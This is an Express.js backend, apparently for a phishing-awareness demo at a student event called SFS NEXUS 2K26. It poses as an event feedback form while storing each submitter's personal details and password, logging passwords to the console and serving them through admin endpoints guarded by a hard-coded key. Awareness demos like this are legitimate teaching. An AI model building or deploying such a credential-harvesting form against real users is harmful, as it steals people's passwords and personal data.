// ============================================================
//  SFS NEXUS 2K26 – Express Backend Server
//  Stores captured entries in-memory (perfect for live demo)
// ============================================================

const express = require('express');
const cors    = require('cors');
const path    = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

// In-memory store (survives the session)
let captures = [];

// ── Middleware ──
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── API: Submit a new entry (called by student form) ──
app.post('/api/submit', (req, res) => {
  const entry = {
    id:         Date.now(),
    timestamp:  new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    fullName:   req.body.fullName   || '',
    rollNo:     req.body.rollNo     || '',
    email:      req.body.email      || '',
    phone:      req.body.phone      || '',
    department: req.body.department || '',
    year:       req.body.year       || '',
    password:   req.body.password   || '',   // ← captured for demo reveal
    event:      req.body.event      || '',
    rating:     req.body.rating     || '',
    feedback:   req.body.feedback   || '',
  };
  captures.push(entry);
  console.log(`[${entry.timestamp}] New capture: ${entry.fullName} | ${entry.email} | PW: ${entry.password}`);
  res.json({ success: true, ref: 'NEX-' + Math.random().toString(36).slice(2,8).toUpperCase() });
});

// ── API: Get all entries (admin panel) ──
app.get('/api/captures', (req, res) => {
  const adminKey = req.query.key;
  if (adminKey !== process.env.ADMIN_KEY && adminKey !== 'nexus2k26admin') {
    return res.status(403).json({ error: 'Unauthorized' });
  }
  res.json(captures);
});

// ── API: Clear all entries ──
app.delete('/api/captures', (req, res) => {
  const adminKey = req.query.key;
  if (adminKey !== process.env.ADMIN_KEY && adminKey !== 'nexus2k26admin') {
    return res.status(403).json({ error: 'Unauthorized' });
  }
  captures = [];
  res.json({ success: true });
});

// ── Stats endpoint ──
app.get('/api/stats', (req, res) => {
  const adminKey = req.query.key;
  if (adminKey !== process.env.ADMIN_KEY && adminKey !== 'nexus2k26admin') {
    return res.status(403).json({ error: 'Unauthorized' });
  }
  const ratings  = captures.filter(c => c.rating).map(c => +c.rating);
  const avgRating = ratings.length ? (ratings.reduce((a,b)=>a+b,0)/ratings.length).toFixed(1) : null;
  const depts     = new Set(captures.map(c => c.department).filter(Boolean));
  res.json({
    total:   captures.length,
    passwords: captures.filter(c => c.password).length,
    avgRating,
    departments: depts.size,
  });
});

// ── Fallback: serve index.html for any unknown route ──
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 SFS NEXUS Demo Server running on port ${PORT}`);
  console.log(`   Student page : http://localhost:${PORT}/`);
  console.log(`   Admin panel  : http://localhost:${PORT}/admin.html`);
  console.log(`   Admin pass   : nexus2k26admin`);
});
